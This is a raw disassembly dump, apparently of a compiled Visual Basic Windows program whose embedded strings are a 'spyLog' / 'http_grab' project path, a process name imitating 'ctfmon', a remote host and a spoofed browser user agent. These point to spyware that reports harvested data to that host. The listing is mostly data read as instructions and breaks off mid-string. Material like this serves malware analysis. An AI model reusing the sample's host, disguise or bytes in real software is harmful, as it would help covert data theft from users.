  401def:	00 68 2d             	add    %ch,0x2d(%eax)
  401df2:	40                   	inc    %eax
  401df3:	00 07                	add    %al,(%edi)
  401df5:	00 00                	add    %al,(%eax)
  401df7:	00 1c 2d 40 00 07 00 	add    %bl,0x70040(,%ebp,1)
  401dfe:	00 00                	add    %al,(%eax)
  401e00:	c4 2c 40             	les    (%eax,%eax,2),%ebp
  401e03:	00 07                	add    %al,(%edi)
  401e05:	00 00                	add    %al,(%eax)
  401e07:	00 48 2c             	add    %cl,0x2c(%eax)
  401e0a:	40                   	inc    %eax
  401e0b:	00 07                	add    %al,(%edi)
  401e0d:	00 00                	add    %al,(%eax)
  401e0f:	00 f8                	add    %bh,%al
  401e11:	2b 40 00             	sub    0x0(%eax),%eax
  401e14:	07                   	pop    %es
  401e15:	00 00                	add    %al,(%eax)
  401e17:	00 ac 2b 40 00 07 00 	add    %ch,0x70040(%ebx,%ebp,1)
  401e1e:	00 00                	add    %al,(%eax)
  401e20:	60                   	pusha
  401e21:	2b 40 00             	sub    0x0(%eax),%eax
  401e24:	07                   	pop    %es
  401e25:	00 00                	add    %al,(%eax)
  401e27:	00 14 2b             	add    %dl,(%ebx,%ebp,1)
  401e2a:	40                   	inc    %eax
  401e2b:	00 07                	add    %al,(%edi)
  401e2d:	00 00                	add    %al,(%eax)
  401e2f:	00 c8                	add    %cl,%al
  401e31:	2a 40 00             	sub    0x0(%eax),%al
  401e34:	07                   	pop    %es
  401e35:	00 00                	add    %al,(%eax)
  401e37:	00 7c 2a 40          	add    %bh,0x40(%edx,%ebp,1)
  401e3b:	00 07                	add    %al,(%edi)
  401e3d:	00 00                	add    %al,(%eax)
  401e3f:	00 24 2a             	add    %ah,(%edx,%ebp,1)
  401e42:	40                   	inc    %eax
  401e43:	00 07                	add    %al,(%edi)
  401e45:	00 00                	add    %al,(%eax)
  401e47:	00 d0                	add    %dl,%al
  401e49:	29 40 00             	sub    %eax,0x0(%eax)
  401e4c:	07                   	pop    %es
  401e4d:	00 00                	add    %al,(%eax)
  401e4f:	00 84 29 40 00 07 00 	add    %al,0x70040(%ecx,%ebp,1)
  401e56:	00 00                	add    %al,(%eax)
  401e58:	38 29                	cmp    %ch,(%ecx)
  401e5a:	40                   	inc    %eax
  401e5b:	00 07                	add    %al,(%edi)
  401e5d:	00 00                	add    %al,(%eax)
  401e5f:	00 e0                	add    %ah,%al
  401e61:	28 40 00             	sub    %al,0x0(%eax)
  401e64:	07                   	pop    %es
  401e65:	00 00                	add    %al,(%eax)
  401e67:	00 98 28 40 00 f4    	add    %bl,-0xbffbfd8(%eax)
  401e6d:	01 00                	add    %eax,(%eax)
  401e6f:	00 24 25 40 00 00 00 	add    %ah,0x40(,%eiz,1)
  401e76:	00 00                	add    %al,(%eax)
  401e78:	60                   	pusha
  401e79:	3b 40 00             	cmp    0x0(%eax),%eax
  401e7c:	d0 98 40 00 f4 0a    	rcrb   $1,0xaf40040(%eax)
  401e82:	00 00                	add    %al,(%eax)
  401e84:	08 a0 40 00 a6 14    	or     %ah,0x14a60040(%eax)
  401e8a:	40                   	inc    %eax
  401e8b:	00 00                	add    %al,(%eax)
  401e8d:	a0 40 00 2a 00       	mov    0x2a0040,%al
  401e92:	5c                   	pop    %esp
  401e93:	00 41 00             	add    %al,0x0(%ecx)
  401e96:	45                   	inc    %ebp
  401e97:	00 3a                	add    %bh,(%edx)
  401e99:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  401e9d:	00 70 00             	add    %dh,0x0(%eax)
  401ea0:	79 00                	jns    0x401ea2
  401ea2:	4c                   	dec    %esp
  401ea3:	00 6f 00             	add    %ch,0x0(%edi)
  401ea6:	67 00 5c 00          	add    %bl,0x0(%si)
  401eaa:	63 00                	arpl   %eax,(%eax)
  401eac:	66 00 74 00 6d       	data16 add %dh,0x6d(%eax,%eax,1)
  401eb1:	00 6f 00             	add    %ch,0x0(%edi)
  401eb4:	6e                   	outsb  %ds:(%esi),(%dx)
  401eb5:	00 5f 00             	add    %bl,0x0(%edi)
  401eb8:	76 00                	jbe    0x401eba
  401eba:	33 00                	xor    (%eax),%eax
  401ebc:	2e 00 35 00 5f 00 68 	add    %dh,%cs:0x68005f00
  401ec3:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  401ec7:	00 70 00             	add    %dh,0x0(%eax)
  401eca:	5f                   	pop    %edi
  401ecb:	00 67 00             	add    %ah,0x0(%edi)
  401ece:	72 00                	jb     0x401ed0
  401ed0:	61                   	popa
  401ed1:	00 62 00             	add    %ah,0x0(%edx)
  401ed4:	5c                   	pop    %esp
  401ed5:	00 63 00             	add    %ah,0x0(%ebx)
  401ed8:	66 00 74 00 6d       	data16 add %dh,0x6d(%eax,%eax,1)
  401edd:	00 6f 00             	add    %ch,0x0(%edi)
  401ee0:	6e                   	outsb  %ds:(%esi),(%dx)
  401ee1:	00 2e                	add    %ch,(%esi)
  401ee3:	00 76 00             	add    %dh,0x0(%esi)
  401ee6:	62 00                	bound  %eax,(%eax)
  401ee8:	70 00                	jo     0x401eea
	...
  40209e:	00 00                	add    %al,(%eax)
  4020a0:	cc                   	int3
  4020a1:	1d 40 00 14 00       	sbb    $0x140040,%eax
  4020a6:	00 00                	add    %al,(%eax)
  4020a8:	01 00                	add    %eax,(%eax)
  4020aa:	00 00                	add    %al,(%eax)
  4020ac:	24 25                	and    $0x25,%al
  4020ae:	40                   	inc    %eax
  4020af:	00 00                	add    %al,(%eax)
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	00 18                	add    %bl,(%eax)
  4020b5:	3a 40 00             	cmp    0x0(%eax),%al
  4020b8:	ff                   	(bad)
  4020b9:	ff                   	(bad)
  4020ba:	ff                   	(bad)
  4020bb:	ff 00                	incl   (%eax)
  4020bd:	00 00                	add    %al,(%eax)
  4020bf:	00 78 25             	add    %bh,0x25(%eax)
  4020c2:	40                   	inc    %eax
  4020c3:	00 08                	add    %cl,(%eax)
  4020c5:	a0 40 00 13 00       	mov    0x130040,%al
  4020ca:	00 00                	add    %al,(%eax)
  4020cc:	20 21                	and    %ah,(%ecx)
  4020ce:	40                   	inc    %eax
	...
  4020db:	00 20                	add    %ah,(%eax)
  4020dd:	21 40 00             	and    %eax,0x0(%eax)
  4020e0:	01 00                	add    %eax,(%eax)
  4020e2:	00 00                	add    %al,(%eax)
  4020e4:	34 27                	xor    $0x27,%al
  4020e6:	40                   	inc    %eax
  4020e7:	00 00                	add    %al,(%eax)
  4020e9:	00 00                	add    %al,(%eax)
  4020eb:	00 6c 21 40          	add    %ch,0x40(%ecx,%eiz,1)
  4020ef:	00 01                	add    %al,(%ecx)
  4020f1:	00 00                	add    %al,(%eax)
  4020f3:	00 74 21 40          	add    %dh,0x40(%ecx,%eiz,1)
  4020f7:	00 00                	add    %al,(%eax)
  4020f9:	00 00                	add    %al,(%eax)
  4020fb:	00 70 21             	add    %dh,0x21(%eax)
  4020fe:	40                   	inc    %eax
  4020ff:	00 07                	add    %al,(%edi)
  402101:	00 00                	add    %al,(%eax)
  402103:	00 74 21 40          	add    %dh,0x40(%ecx,%eiz,1)
  402107:	00 0b                	add    %cl,(%ebx)
  402109:	00 b7 01 68 00 6c    	add    %dh,0x6c006801(%edi)
  40210f:	00 8c 22 40 00 cc a3 	add    %cl,-0x5c33ffc0(%edx,%eiz,1)
  402116:	40                   	inc    %eax
  402117:	00 00                	add    %al,(%eax)
  402119:	00 00                	add    %al,(%eax)
  40211b:	00 b4 1b b2 00 28 ac 	add    %dh,-0x53d7ff4e(%ebx,%ebx,1)
  402122:	b0 00                	mov    $0x0,%al
  402124:	00 00                	add    %al,(%eax)
  402126:	01 00                	add    %eax,(%eax)
  402128:	6a 01                	push   $0x1
	...
  402136:	00 00                	add    %al,(%eax)
  402138:	30 a0 b0 00 00 00    	xor    %ah,0xb0(%eax)
  40213e:	0d 00 00 00 00       	or     $0x0,%eax
	...
  40215b:	00 3c ac             	add    %bh,(%esp,%ebp,4)
  40215e:	b0 00                	mov    $0x0,%al
  402160:	00 00                	add    %al,(%eax)
  402162:	01 00                	add    %eax,(%eax)
  402164:	8b 01                	mov    (%ecx),%eax
  402166:	00 00                	add    %al,(%eax)
  402168:	00 00                	add    %al,(%eax)
  40216a:	00 00                	add    %al,(%eax)
  40216c:	44                   	inc    %esp
  40216d:	27                   	daa
  40216e:	40                   	inc    %eax
  40216f:	00 54 27 40          	add    %dl,0x40(%edi,%eiz,1)
  402173:	00 40 00             	add    %al,0x0(%eax)
  402176:	18 00                	sbb    %al,(%eax)
  402178:	40                   	inc    %eax
  402179:	00 00                	add    %al,(%eax)
  40217b:	00 64 27 40          	add    %ah,0x40(%edi,%eiz,1)
  40217f:	00 05 00 03 00 00    	add    %al,0x300
  402185:	00 00                	add    %al,(%eax)
  402187:	00 00                	add    %al,(%eax)
  402189:	00 00                	add    %al,(%eax)
  40218b:	00 b8 22 40 00 9c    	add    %bh,-0x63ffbfde(%eax)
  402191:	0d b2 00 74 27       	or     $0x277400b2,%eax
  402196:	40                   	inc    %eax
  402197:	00 05 00 03 00 40    	add    %al,0x40000300
  40219d:	00 01                	add    %al,(%ecx)
  40219f:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  4021a3:	00 f4                	add    %dh,%ah
  4021a5:	27                   	daa
  4021a6:	40                   	inc    %eax
  4021a7:	00 02                	add    %al,(%edx)
  4021a9:	00 03                	add    %al,(%ebx)
	...
  4021b3:	00 30                	add    %dh,(%eax)
  4021b5:	23 40 00             	and    0x0(%eax),%eax
  4021b8:	ac                   	lods   %ds:(%esi),%al
  4021b9:	0d b2 00 04 28       	or     $0x280400b2,%eax
  4021be:	40                   	inc    %eax
  4021bf:	00 02                	add    %al,(%edx)
  4021c1:	00 03                	add    %al,(%ebx)
  4021c3:	00 40 00             	add    %al,0x0(%eax)
  4021c6:	12 00                	adc    (%eax),%al
  4021c8:	48                   	dec    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	00 0c 28             	add    %cl,(%eax,%ebp,1)
  4021ce:	40                   	inc    %eax
  4021cf:	00 06                	add    %al,(%esi)
  4021d1:	00 03                	add    %al,(%ebx)
	...
  4021db:	00 4c 23 40          	add    %cl,0x40(%ebx,%eiz,1)
  4021df:	00 bc 0d b2 00 1c 28 	add    %bh,0x281c00b2(%ebp,%ecx,1)
  4021e6:	40                   	inc    %eax
  4021e7:	00 06                	add    %al,(%esi)
  4021e9:	00 03                	add    %al,(%ebx)
  4021eb:	00 40 00             	add    %al,0x0(%eax)
  4021ee:	01 00                	add    %eax,(%eax)
  4021f0:	4c                   	dec    %esp
  4021f1:	00 00                	add    %al,(%eax)
  4021f3:	00 f4                	add    %dh,%ah
  4021f5:	27                   	daa
  4021f6:	40                   	inc    %eax
  4021f7:	00 03                	add    %al,(%ebx)
  4021f9:	00 03                	add    %al,(%ebx)
	...
  402203:	00 ac 23 40 00 ac 0d 	add    %ch,0xdac0040(%ebx,%eiz,1)
  40220a:	b2 00                	mov    $0x0,%dl
  40220c:	24 28                	and    $0x28,%al
  40220e:	40                   	inc    %eax
  40220f:	00 03                	add    %al,(%ebx)
  402211:	00 03                	add    %al,(%ebx)
  402213:	00 40 00             	add    %al,0x0(%eax)
  402216:	1f                   	pop    %ds
  402217:	00 50 00             	add    %dl,0x0(%eax)
  40221a:	00 00                	add    %al,(%eax)
  40221c:	2c 28                	sub    $0x28,%al
  40221e:	40                   	inc    %eax
  40221f:	00 ff                	add    %bh,%bh
  402221:	ff                   	(bad)
  402222:	ff                   	(bad)
  402223:	ff 00                	incl   (%eax)
  402225:	00 00                	add    %al,(%eax)
  402227:	00 00                	add    %al,(%eax)
  402229:	00 00                	add    %al,(%eax)
  40222b:	00 c8                	add    %cl,%al
  40222d:	23 40 00             	and    0x0(%eax),%eax
  402230:	cc                   	int3
  402231:	0d b2 00 3c 28       	or     $0x283c00b2,%eax
  402236:	40                   	inc    %eax
  402237:	00 ff                	add    %bh,%bh
  402239:	ff                   	(bad)
  40223a:	ff                   	(bad)
  40223b:	ff 40 00             	incl   0x0(%eax)
  40223e:	01 00                	add    %eax,(%eax)
  402240:	54                   	push   %esp
  402241:	00 00                	add    %al,(%eax)
  402243:	00 f4                	add    %dh,%ah
  402245:	27                   	daa
  402246:	40                   	inc    %eax
  402247:	00 04 00             	add    %al,(%eax,%eax,1)
  40224a:	03 00                	add    (%eax),%eax
	...
  402254:	5c                   	pop    %esp
  402255:	24 40                	and    $0x40,%al
  402257:	00 ac 0d b2 00 44 28 	add    %ch,0x284400b2(%ebp,%ecx,1)
  40225e:	40                   	inc    %eax
  40225f:	00 04 00             	add    %al,(%eax,%eax,1)
  402262:	03 00                	add    (%eax),%eax
  402264:	40                   	inc    %eax
  402265:	00 01                	add    %al,(%ecx)
  402267:	00 58 00             	add    %bl,0x0(%eax)
  40226a:	00 00                	add    %al,(%eax)
  40226c:	f4                   	hlt
  40226d:	27                   	daa
  40226e:	40                   	inc    %eax
  40226f:	00 01                	add    %al,(%ecx)
  402271:	00 03                	add    %al,(%ebx)
	...
  40227b:	00 78 24             	add    %bh,0x24(%eax)
  40227e:	40                   	inc    %eax
  40227f:	00 ac 0d b2 00 4c 28 	add    %ch,0x284c00b2(%ebp,%ecx,1)
  402286:	40                   	inc    %eax
  402287:	00 01                	add    %al,(%ecx)
  402289:	00 03                	add    %al,(%ebx)
  40228b:	00 a9 24 40 00 9c    	add    %ch,-0x63ffbfdc(%ecx)
  402291:	24 40                	and    $0x40,%al
  402293:	00 b6 24 40 00 c3    	add    %dh,-0x3cffbfdc(%esi)
  402299:	24 40                	and    $0x40,%al
  40229b:	00 d0                	add    %dl,%al
  40229d:	24 40                	and    $0x40,%al
  40229f:	00 dd                	add    %bl,%ch
  4022a1:	24 40                	and    $0x40,%al
  4022a3:	00 ea                	add    %ch,%dl
  4022a5:	24 40                	and    $0x40,%al
  4022a7:	00 f7                	add    %dh,%bh
  4022a9:	24 40                	and    $0x40,%al
  4022ab:	00 04 25 40 00 11 25 	add    %al,0x25110040(,%eiz,1)
  4022b2:	40                   	inc    %eax
  4022b3:	00 1e                	add    %bl,(%esi)
  4022b5:	25 40 00 00 00       	and    $0x40,%eax
  4022ba:	00 00                	add    %al,(%eax)
  4022bc:	74 21                	je     0x4022df
  4022be:	40                   	inc    %eax
  4022bf:	00 a8 20 40 00 aa    	add    %ch,-0x55ffbfe0(%eax)
  4022c5:	16                   	push   %ss
  4022c6:	40                   	inc    %eax
  4022c7:	00 b0 16 40 00 b6    	add    %dh,-0x49ffbfea(%eax)
  4022cd:	16                   	push   %ss
  4022ce:	40                   	inc    %eax
  4022cf:	00 fc                	add    %bh,%ah
  4022d1:	24 40                	and    $0x40,%al
	...
  402333:	00 9c 21 40 00 a8 20 	add    %bl,0x20a80040(%ecx,%eiz,1)
  40233a:	40                   	inc    %eax
  40233b:	00 aa 16 40 00 b0    	add    %ch,-0x4fffbfea(%edx)
  402341:	16                   	push   %ss
  402342:	40                   	inc    %eax
  402343:	00 b6 16 40 00 ef    	add    %dh,-0x10ffbfea(%esi)
  402349:	24 40                	and    $0x40,%al
  40234b:	00 00                	add    %al,(%eax)
  40234d:	00 00                	add    %al,(%eax)
  40234f:	00 c4                	add    %al,%ah
  402351:	21 40 00             	and    %eax,0x0(%eax)
  402354:	a8 20                	test   $0x20,%al
  402356:	40                   	inc    %eax
  402357:	00 aa 16 40 00 b0    	add    %ch,-0x4fffbfea(%edx)
  40235d:	16                   	push   %ss
  40235e:	40                   	inc    %eax
  40235f:	00 b6 16 40 00 00    	add    %dh,0x4016(%esi)
	...
  4023ad:	00 00                	add    %al,(%eax)
  4023af:	00 ec                	add    %ch,%ah
  4023b1:	21 40 00             	and    %eax,0x0(%eax)
  4023b4:	a8 20                	test   $0x20,%al
  4023b6:	40                   	inc    %eax
  4023b7:	00 aa 16 40 00 b0    	add    %ch,-0x4fffbfea(%edx)
  4023bd:	16                   	push   %ss
  4023be:	40                   	inc    %eax
  4023bf:	00 b6 16 40 00 09    	add    %dh,0x9004016(%esi)
  4023c5:	25 40 00 00 00       	and    $0x40,%eax
  4023ca:	00 00                	add    %al,(%eax)
  4023cc:	14 22                	adc    $0x22,%al
  4023ce:	40                   	inc    %eax
  4023cf:	00 a8 20 40 00 aa    	add    %ch,-0x55ffbfe0(%eax)
  4023d5:	16                   	push   %ss
  4023d6:	40                   	inc    %eax
  4023d7:	00 b0 16 40 00 b6    	add    %dh,-0x49ffbfea(%eax)
  4023dd:	16                   	push   %ss
  4023de:	40                   	inc    %eax
	...
  4023f7:	00 94 24 40 00 00 00 	add    %dl,0x40(%esp)
	...
  40245e:	00 00                	add    %al,(%eax)
  402460:	3c 22                	cmp    $0x22,%al
  402462:	40                   	inc    %eax
  402463:	00 a8 20 40 00 aa    	add    %ch,-0x55ffbfe0(%eax)
  402469:	16                   	push   %ss
  40246a:	40                   	inc    %eax
  40246b:	00 b0 16 40 00 b6    	add    %dh,-0x49ffbfea(%eax)
  402471:	16                   	push   %ss
  402472:	40                   	inc    %eax
  402473:	00 d5                	add    %dl,%ch
  402475:	24 40                	and    $0x40,%al
  402477:	00 00                	add    %al,(%eax)
  402479:	00 00                	add    %al,(%eax)
  40247b:	00 64 22 40          	add    %ah,0x40(%edx,%eiz,1)
  40247f:	00 a8 20 40 00 aa    	add    %ch,-0x55ffbfe0(%eax)
  402485:	16                   	push   %ss
  402486:	40                   	inc    %eax
  402487:	00 b0 16 40 00 b6    	add    %dh,-0x49ffbfea(%eax)
  40248d:	16                   	push   %ss
  40248e:	40                   	inc    %eax
  40248f:	00 c8                	add    %cl,%al
  402491:	24 40                	and    $0x40,%al
  402493:	00 81 6c 24 04 4f    	add    %al,0x4f04246c(%ecx)
  402499:	00 00                	add    %al,(%eax)
  40249b:	00 e9                	add    %ch,%cl
  40249d:	cf                   	iret
  40249e:	16                   	push   %ss
  40249f:	00 00                	add    %al,(%eax)
  4024a1:	81 6c 24 04 ff ff 00 	subl   $0xffff,0x4(%esp)
  4024a8:	00 
  4024a9:	e9 a2 18 00 00       	jmp    0x403d50
  4024ae:	81 6c 24 04 ff ff 00 	subl   $0xffff,0x4(%esp)
  4024b5:	00 
  4024b6:	e9 55 1e 00 00       	jmp    0x404310
  4024bb:	81 6c 24 04 ff ff 00 	subl   $0xffff,0x4(%esp)
  4024c2:	00 
  4024c3:	e9 28 21 00 00       	jmp    0x4045f0
  4024c8:	81 6c 24 04 57 00 00 	subl   $0x57,0x4(%esp)
  4024cf:	00 
  4024d0:	e9 9b 22 00 00       	jmp    0x404770
  4024d5:	81 6c 24 04 53 00 00 	subl   $0x53,0x4(%esp)
  4024dc:	00 
  4024dd:	e9 7e 2f 00 00       	jmp    0x405460
  4024e2:	81 6c 24 04 ff ff 00 	subl   $0xffff,0x4(%esp)
  4024e9:	00 
  4024ea:	e9 c1 35 00 00       	jmp    0x405ab0
  4024ef:	81 6c 24 04 43 00 00 	subl   $0x43,0x4(%esp)
  4024f6:	00 
  4024f7:	e9 54 3a 00 00       	jmp    0x405f50
  4024fc:	81 6c 24 04 3f 00 00 	subl   $0x3f,0x4(%esp)
  402503:	00 
  402504:	e9 47 6b 00 00       	jmp    0x409050
  402509:	81 6c 24 04 4b 00 00 	subl   $0x4b,0x4(%esp)
  402510:	00 
  402511:	e9 aa 6c 00 00       	jmp    0x4091c0
  402516:	81 6c 24 04 ff ff 00 	subl   $0xffff,0x4(%esp)
  40251d:	00 
  40251e:	e9 0d 71 00 00       	jmp    0x409630
  402523:	00 00                	add    %al,(%eax)
  402525:	00 00                	add    %al,(%eax)
  402527:	00 2c a0             	add    %ch,(%eax,%eiz,4)
  40252a:	40                   	inc    %eax
  40252b:	00 d0                	add    %dl,%al
  40252d:	3a 40 00             	cmp    0x0(%eax),%al
  402530:	ff                   	(bad)
  402531:	ff                   	(bad)
  402532:	ff                   	(bad)
  402533:	ff 00                	incl   (%eax)
  402535:	00 00                	add    %al,(%eax)
  402537:	00 1c a0             	add    %bl,(%eax,%eiz,4)
  40253a:	40                   	inc    %eax
  40253b:	00 1f                	add    %bl,(%edi)
  40253d:	11 ca                	adc    %ecx,%edx
  40253f:	05 29 aa 47 46       	add    $0x4647aa29,%eax
  402544:	bc 12 dc bb 50       	mov    $0x50bbdc12,%esp
  402549:	dd 21                	frstor (%ecx)
  40254b:	fe 0a                	decb   (%edx)
  40254d:	00 01                	add    %al,(%ecx)
  40254f:	00 01                	add    %al,(%ecx)
  402551:	00 01                	add    %al,(%ecx)
  402553:	00 78 25             	add    %bh,0x25(%eax)
  402556:	40                   	inc    %eax
	...
  402563:	00 28                	add    %ch,(%eax)
  402565:	26 40                	es inc %eax
  402567:	00 09                	add    %cl,(%ecx)
  402569:	04 00                	add    $0x0,%al
  40256b:	00 10                	add    %dl,(%eax)
  40256d:	04 00                	add    $0x0,%al
  40256f:	00 00                	add    %al,(%eax)
  402571:	00 00                	add    %al,(%eax)
  402573:	00 02                	add    %al,(%edx)
  402575:	00 00                	add    %al,(%eax)
  402577:	00 a8 20 40 00 ff    	add    %ch,-0xffbfe0(%eax)
  40257d:	ff                   	(bad)
  40257e:	ff                   	(bad)
  40257f:	ff ac 2c 40 00 00 00 	ljmp   *0x40(%esp,%ebp,1)
	...
  40258e:	00 00                	add    %al,(%eax)
  402590:	20 26                	and    %ah,(%esi)
  402592:	40                   	inc    %eax
  402593:	00 1e                	add    %bl,(%esi)
  402595:	00 00                	add    %al,(%eax)
  402597:	00 a8 25 40 00 ff    	add    %ch,-0xffbfdb(%eax)
  40259d:	ff 00                	incl   (%eax)
  40259f:	00 83 80 01 00 00    	add    %al,0x180(%ebx)
	...
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	00 a0 2c 40 00 00    	add    %ah,0x402c(%eax)
	...
  40261d:	00 00                	add    %al,(%eax)
  40261f:	00 66 72             	add    %ah,0x72(%esi)
  402622:	6d                   	insl   (%dx),%es:(%edi)
  402623:	4d                   	dec    %ebp
  402624:	61                   	popa
  402625:	69 6e 00 63 66 74 6d 	imul   $0x6d746663,0x0(%esi),%ebp
  40262c:	6f                   	outsl  %ds:(%esi),(%dx)
  40262d:	6e                   	outsb  %ds:(%esi),(%dx)
  40262e:	00 00                	add    %al,(%eax)
  402630:	1c 00                	sbb    $0x0,%al
  402632:	00 00                	add    %al,(%eax)
  402634:	37                   	aaa
  402635:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  402639:	00 33                	add    %dh,(%ebx)
  40263b:	00 38                	add    %bh,(%eax)
  40263d:	00 61 00             	add    %ah,0x0(%ecx)
  402640:	31 00                	xor    %eax,(%eax)
  402642:	31 00                	xor    %eax,(%eax)
  402644:	32 00                	xor    (%eax),%al
  402646:	65 00 30             	add    %dh,%gs:(%eax)
  402649:	00 38                	add    %bh,(%eax)
  40264b:	00 65 00             	add    %ah,0x0(%ebp)
  40264e:	61                   	popa
  40264f:	00 00                	add    %al,(%eax)
  402651:	00 00                	add    %al,(%eax)
  402653:	00 2e                	add    %ch,(%esi)
  402655:	00 00                	add    %al,(%eax)
  402657:	00 66 00             	add    %ah,0x0(%esi)
  40265a:	75 00                	jne    0x40265c
  40265c:	6a 00                	push   $0x0
  40265e:	69 00 6e 00 61 00    	imul   $0x61006e,(%eax),%eax
  402664:	6d                   	insl   (%dx),%es:(%edi)
  402665:	00 61 00             	add    %ah,0x0(%ecx)
  402668:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  40266c:	6c                   	insb   (%dx),%es:(%edi)
  40266d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  402671:	00 72 00             	add    %dh,0x0(%edx)
  402674:	76 00                	jbe    0x402676
  402676:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40267c:	61                   	popa
  40267d:	00 2e                	add    %ch,(%esi)
  40267f:	00 6f 00             	add    %ch,0x0(%edi)
  402682:	72 00                	jb     0x402684
  402684:	67 00 00             	add    %al,(%bx,%si)
  402687:	00 96 00 00 00 4d    	add    %dl,0x4d000000(%esi)
  40268d:	00 6f 00             	add    %ch,0x0(%edi)
  402690:	7a 00                	jp     0x402692
  402692:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  402698:	61                   	popa
  402699:	00 2f                	add    %ch,(%edi)
  40269b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40269e:	2e 00 30             	add    %dh,%cs:(%eax)
  4026a1:	00 20                	add    %ah,(%eax)
  4026a3:	00 28                	add    %ch,(%eax)
  4026a5:	00 63 00             	add    %ah,0x0(%ebx)
  4026a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a9:	00 6d 00             	add    %ch,0x0(%ebp)
  4026ac:	70 00                	jo     0x4026ae
  4026ae:	61                   	popa
  4026af:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4026b3:	00 62 00             	add    %ah,0x0(%edx)
  4026b6:	6c                   	insb   (%dx),%es:(%edi)
  4026b7:	00 65 00             	add    %ah,0x0(%ebp)
  4026ba:	3b 00                	cmp    (%eax),%eax
  4026bc:	20 00                	and    %al,(%eax)
  4026be:	4d                   	dec    %ebp
  4026bf:	00 53 00             	add    %dl,0x0(%ebx)
  4026c2:	49                   	dec    %ecx
  4026c3:	00 45 00             	add    %al,0x0(%ebp)
  4026c6:	20 00                	and    %al,(%eax)
  4026c8:	37                   	aaa
  4026c9:	00 2e                	add    %ch,(%esi)
  4026cb:	00 30                	add    %dh,(%eax)
  4026cd:	00 3b                	add    %bh,(%ebx)
  4026cf:	00 20                	add    %ah,(%eax)
  4026d1:	00 57 00             	add    %dl,0x0(%edi)
  4026d4:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4026da:	6f                   	outsl  %ds:(%esi),(%dx)
  4026db:	00 77 00             	add    %dh,0x0(%edi)
  4026de:	73 00                	jae    0x4026e0
  4026e0:	20 00                	and    %al,(%eax)
  4026e2:	4e                   	dec    %esi
  4026e3:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  4026e7:	00 35 00 2e 00 31    	add    %dh,0x31002e00
  4026ed:	00 3b                	add    %bh,(%ebx)
  4026ef:	00 20                	add    %ah,(%eax)
  4026f1:	00 53 00             	add    %dl,0x0(%ebx)
  4026f4:	56                   	push   %esi
  4026f5:	00 31                	add    %dh,(%ecx)
  4026f7:	00 3b                	add    %bh,(%ebx)
  4026f9:	00 20                	add    %ah,(%eax)
  4026fb:	00 2e                	add    %ch,(%esi)
  4026fd:	00 4e 00             	add    %cl,0x0(%esi)
  402700:	45                   	inc    %ebp
  402701:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  402705:	00 43 00             	add    %al,0x0(%ebx)
  402708:	4c                   	dec    %esp
  402709:	00 52 00             	add    %dl,0x0(%edx)
  40270c:	20 00                	and    %al,(%eax)
  40270e:	32 00                	xor    (%eax),%al
  402710:	2e 00 30             	add    %dh,%cs:(%eax)
  402713:	00 2e                	add    %ch,(%esi)
  402715:	00 35 00 30 00 37    	add    %dh,0x37003000
  40271b:	00 32                	add    %dh,(%edx)
  40271d:	00 37                	add    %dh,(%edi)
  40271f:	00 29                	add    %ch,(%ecx)
  402721:	00 00                	add    %al,(%eax)
  402723:	00 9e 06 7d c6 c7    	add    %bl,-0x383982fa(%esi)
  402729:	6d                   	insl   (%dx),%es:(%edi)
  40272a:	2d 46 bb 2e 13       	sub    $0x132ebb46,%eax
  40272f:	d9 ed                	fldln2
  402731:	29 ea                	sub    %ebp,%edx
  402733:	16                   	push   %ss
  402734:	0a b3 60 60 c1 f4    	or     -0xb3e9fa0(%ebx),%dh
  40273a:	37                   	aaa
  40273b:	40                   	inc    %eax
  40273c:	bb 8b b2 4b 10       	mov    $0x104bb28b,%ebx
  402741:	25 78 fc 4f 12       	and    $0x124ffc78,%eax
  402746:	c7                   	(bad)
  402747:	19 59 b4             	sbb    %ebx,-0x4c(%ecx)
  40274a:	d9 46 ad             	flds   -0x53(%esi)
  40274d:	48                   	dec    %eax
  40274e:	f0 58                	lock pop %eax
  402750:	3d a6 32 42 46       	cmp    $0x464232a6,%eax
  402755:	7e 48                	jle    0x40279f
  402757:	6a 5e                	push   $0x5e
  402759:	3b e0                	cmp    %eax,%esp
  40275b:	49                   	dec    %ecx
  40275c:	8b 0c 7d b9 bf 1a 70 	mov    0x701abfb9(,%edi,2),%ecx
  402763:	f6 e2                	mul    %dl
  402765:	4e                   	dec    %esi
  402766:	ad                   	lods   %ds:(%esi),%eax
  402767:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  40276d:	0c 00                	or     $0x0,%al
  40276f:	aa                   	stos   %al,%es:(%edi)
  402770:	00 60 d3             	add    %ah,-0x2d(%eax)
  402773:	93                   	xchg   %eax,%ebx
  402774:	54                   	push   %esp
  402775:	65 78 74             	gs js  0x4027ec
  402778:	31 00                	xor    %eax,(%eax)
  40277a:	00 00                	add    %al,(%eax)
  40277c:	2e 3d fb fc fa a0    	cs cmp $0xa0fafcfb,%eax
  402782:	68 10 a7 38 08       	push   $0x838a710
  402787:	00 2b                	add    %ch,(%ebx)
  402789:	33 71 b5             	xor    -0x4b(%ecx),%esi
  40278c:	43                   	inc    %ebx
  40278d:	3a 5c 50 72          	cmp    0x72(%eax,%edx,2),%bl
  402791:	6f                   	outsl  %ds:(%esi),(%dx)
  402792:	67 72 61             	addr16 jb 0x4027f6
  402795:	6d                   	insl   (%dx),%es:(%edi)
  402796:	20 46 69             	and    %al,0x69(%esi)
  402799:	6c                   	insb   (%dx),%es:(%edi)
  40279a:	65 73 20             	gs jae 0x4027bd
  40279d:	28 78 38             	sub    %bh,0x38(%eax)
  4027a0:	36 29 5c 4d 69       	sub    %ebx,%ss:0x69(%ebp,%ecx,2)
